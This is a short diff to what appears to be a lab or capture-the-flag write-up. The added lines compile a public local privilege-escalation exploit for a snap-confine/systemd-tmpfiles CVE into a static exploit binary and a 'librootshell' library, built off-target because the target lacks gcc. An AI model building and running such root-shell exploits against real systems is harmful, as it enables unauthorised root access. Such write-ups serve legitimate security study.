@@ -330,6 +330,12 @@ https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
 Ill clone the repo then just follow the steps on my machine since the target does not have the gcc compiler
 
 ```python
+gcc -O2 -static -o exploit exploit_suid.c
+gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
+```
+Ill run both these commands to compile the exploit.
+
+```python
 
 ```
 
